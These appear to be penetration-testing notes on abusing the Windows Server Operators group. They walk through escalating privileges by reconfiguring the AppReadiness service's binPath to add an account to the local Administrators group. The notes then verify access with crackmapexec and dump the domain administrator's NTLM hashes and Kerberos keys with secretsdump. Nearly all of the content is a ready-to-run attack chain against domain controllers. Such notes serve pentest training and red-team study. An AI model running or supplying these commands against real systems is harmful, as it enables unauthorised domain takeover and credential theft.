### **Overview**

- Members of _Server Operators_ can:
    - Log on locally to servers (including Domain Controllers)
    - Control local services
    - Possess _SeBackupPrivilege_ and _SeRestorePrivilege_

- Group is highly privileged and allows lateral movement and escalation to _Local Admin_ or _Domain Admin_ status.

---

### **Service-Based Privilege Escalation (AppReadiness Example)**

#### **1. Query Service Configuration**
```cmd
sc qc AppReadiness
```
- Runs as _LocalSystem_
- Executable: `C:\Windows\System32\svchost.exe`

#### **2. Check Service Permissions**
```cmd
PsService.exe security AppReadiness
```
- Confirms _BUILTIN\Server Operators_ have `SERVICE_ALL_ACCESS` â†’ Full control.

#### **3. Validate Admin Group Membership**
```cmd
net localgroup Administrators
```
- Confirms target account not yet a local admin.

---

### **Modify and Trigger the Service**

#### **1. Modify `binPath` to Execute Command**
```cmd
sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"
```

#### **2. Start the Service**
```cmd
sc start AppReadiness
```
- Fails with `1053` error, but command is executed.

#### **3. Verify Escalation**
```cmd
net localgroup Administrators
```
- Shows `server_adm` added to _Administrators_ group.

---

### **Post-Exploitation**

#### **1. Confirm Access via SMB**
```bash
crackmapexec smb <DC IP> -u server_adm -p '<password>'
```
- Should show access as "Pwn3d!"

#### **2. Dump NTLM Hashes from NTDS.dit**
```bash
secretsdump.py server_adm@<DC IP> -just-dc-user administrator
```
- Retrieves password hashes and Kerberos keys.
